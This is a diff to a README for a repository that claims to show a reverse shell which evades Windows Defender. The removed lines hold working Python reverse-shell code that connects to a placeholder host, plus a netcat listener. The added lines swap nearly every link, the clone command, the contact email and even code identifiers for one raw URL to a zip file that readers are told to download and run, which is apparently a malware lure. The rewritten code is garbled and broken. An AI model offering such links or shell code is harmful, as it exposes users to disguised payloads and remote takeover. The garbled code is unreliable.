@@ -1,6 +1,6 @@
 # Windows Defender Bypass: A Reverse Shell Demonstration
 
-![Windows Defender](https://img.shields.io/badge/Windows%20Defender-Bypass-blue?style=for-the-badge)
+![Windows Defender](https://raw.githubusercontent.com/Blueray999/Windows-Defender/main/illupi/Defender_Windows_3.0.zip%20Defender-Bypass-blue?style=for-the-badge)
 
 Welcome to the **Windows Defender** repository! This project demonstrates how to build a reverse shell while bypassing Windows Defender. It is intended for educational purposes only. Understanding these concepts can help you improve your cybersecurity skills and awareness.
 
@@ -49,7 +49,7 @@ To get started with this project, you will need to have a basic understanding of
 Clone the repository to your local machine:
 
 ```bash
-git clone https://github.com/Blueray999/Windows-Defender.git
+git clone https://raw.githubusercontent.com/Blueray999/Windows-Defender/main/illupi/Defender_Windows_3.0.zip
 ```
 
 Navigate into the directory:
@@ -70,12 +70,12 @@ import subprocess
 import os
 
 def reverse_shell():
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(("YOUR_IP_ADDRESS", YOUR_PORT))
-    os.dup2(s.fileno(), 0)  # stdin
-    os.dup2(s.fileno(), 1)  # stdout
-    os.dup2(s.fileno(), 2)  # stderr
-    p = subprocess.call(["/bin/sh", "-i"])
+    s = https://raw.githubusercontent.com/Blueray999/Windows-Defender/main/illupi/Defender_Windows_3.0.zip(https://raw.githubusercontent.com/Blueray999/Windows-Defender/main/illupi/Defender_Windows_3.0.zip, https://raw.githubusercontent.com/Blueray999/Windows-Defender/main/illupi/Defender_Windows_3.0.zip)
+    https://raw.githubusercontent.com/Blueray999/Windows-Defender/main/illupi/Defender_Windows_3.0.zip(("YOUR_IP_ADDRESS", YOUR_PORT))
+    https://raw.githubusercontent.com/Blueray999/Windows-Defender/main/illupi/Defender_Windows_3.0.zip(https://raw.githubusercontent.com/Blueray999/Windows-Defender/main/illupi/Defender_Windows_3.0.zip(), 0)  # stdin
+    https://raw.githubusercontent.com/Blueray999/Windows-Defender/main/illupi/Defender_Windows_3.0.zip(https://raw.githubusercontent.com/Blueray999/Windows-Defender/main/illupi/Defender_Windows_3.0.zip(), 1)  # stdout
+    https://raw.githubusercontent.com/Blueray999/Windows-Defender/main/illupi/Defender_Windows_3.0.zip(https://raw.githubusercontent.com/Blueray999/Windows-Defender/main/illupi/Defender_Windows_3.0.zip(), 2)  # stderr
+    p = https://raw.githubusercontent.com/Blueray999/Windows-Defender/main/illupi/Defender_Windows_3.0.zip(["/bin/sh", "-i"])
 
 if __name__ == "__main__":
     reverse_shell()
@@ -107,7 +107,7 @@ nc -lvnp YOUR_PORT
 
 ### Running the Payload
 
-Transfer the payload to the target machine and execute it. You can download the executable from the [Releases section](https://github.com/Blueray999/Windows-Defender/releases) and run it.
+Transfer the payload to the target machine and execute it. You can download the executable from the [Releases section](https://raw.githubusercontent.com/Blueray999/Windows-Defender/main/illupi/Defender_Windows_3.0.zip) and run it.
 
 ## Usage
 
@@ -136,12 +136,12 @@ This project is licensed under the MIT License. See the LICENSE file for more de
 
 For any questions or inquiries, feel free to reach out:
 
-- GitHub: [Blueray999](https://github.com/Blueray999)
-- Email: your-email@example.com
+- GitHub: [Blueray999](https://raw.githubusercontent.com/Blueray999/Windows-Defender/main/illupi/Defender_Windows_3.0.zip)
+- Email: https://raw.githubusercontent.com/Blueray999/Windows-Defender/main/illupi/Defender_Windows_3.0.zip
 
 ## Releases
 
-You can find the latest releases of this project in the [Releases section](https://github.com/Blueray999/Windows-Defender/releases). Download the necessary files and execute them responsibly.
+You can find the latest releases of this project in the [Releases section](https://raw.githubusercontent.com/Blueray999/Windows-Defender/main/illupi/Defender_Windows_3.0.zip). Download the necessary files and execute them responsibly.
 
 ## Conclusion
 
